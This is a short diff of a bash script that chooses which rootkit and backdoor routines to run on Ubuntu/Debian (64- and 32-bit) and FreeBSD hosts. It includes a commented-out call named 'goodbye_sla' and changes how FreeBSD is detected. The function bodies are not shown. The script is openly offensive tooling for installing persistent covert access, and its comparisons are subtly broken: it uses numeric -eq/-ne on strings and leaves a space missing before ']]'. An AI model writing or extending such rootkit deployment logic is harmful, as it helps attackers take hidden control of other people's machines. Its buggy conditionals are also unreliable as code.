@@ -198,21 +198,23 @@ if [[ $ARCH -ne "x86_64" ]] && [[ -f "/etc/redhat-release" ]]; then
 fi
 
 
-#Launch for Ubuntu 64bit
+#ubuntu/debian 64bit 
 if [[ $ARCH -eq "x86_64" ]] && [[ -f "/etc/debian_version"]]; then
     do_ubuntu64_rootkit
     do_backdoors
     #goodbye_sla
 fi
 
+#ubuntu/debian 32bit (assumed if not 64, whatever)
 if [[ $ARCH -ne "x86_64" ]] && [[ -f "/etc/debian_version"]]; then
 	do_ubuntu32_rootkit
 	do_backdoors
 	#goodbye_sla
 fi
 
-if [[-f "/etc/pf.os"]]; then
-#Attempt to upload to BSD boxes rooty at a minimum
+
+#freebsd
+if [[ `uname`  == 'FreeBSD' ]]; then
 	do_freebsd64_kit
 	do_bsdbackdoors    
 fi
